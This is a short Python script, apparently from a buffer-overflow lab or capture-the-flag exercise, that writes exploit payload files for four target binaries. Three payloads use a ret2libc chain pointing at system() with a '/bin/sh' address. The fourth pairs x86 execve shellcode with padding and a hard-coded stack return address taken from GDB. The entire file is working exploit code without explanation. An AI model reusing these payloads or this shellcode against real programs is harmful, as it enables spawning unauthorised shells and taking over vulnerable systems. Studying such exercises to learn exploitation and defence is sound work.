import struct
import os

curr_dir = os.path.dirname(os.path.abspath(__file__))

# Ret2libc values
system = struct.pack('<I', 0xb7dd58e0)
fakeret = struct.pack('<I', 0xdeadbeef)
binsh = struct.pack('<I', 0xb7f42de8)

# bin.1, bin.3, bin.4 (ret2libc)
pad_ret2libc = b"A" * 52
payload_ret2libc = pad_ret2libc + system + fakeret + binsh

for b in [1, 3, 4]:
    with open(os.path.join(curr_dir, f"exploit.{b}"), "wb") as f:
        f.write(str(len(payload_ret2libc)).encode() + b" " + payload_ret2libc)

# bin.2 (shellcode)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
pad_sc = b"A" * (52 - len(shellcode))
retaddr = struct.pack('<I', 0xbfffe2d8)  # EBP - 0x30 from GDB (regina 2)
payload_sc = shellcode + pad_sc + retaddr

with open(os.path.join(curr_dir, "exploit.2"), "wb") as f:
    f.write(str(len(payload_sc)).encode() + b" " + payload_sc)
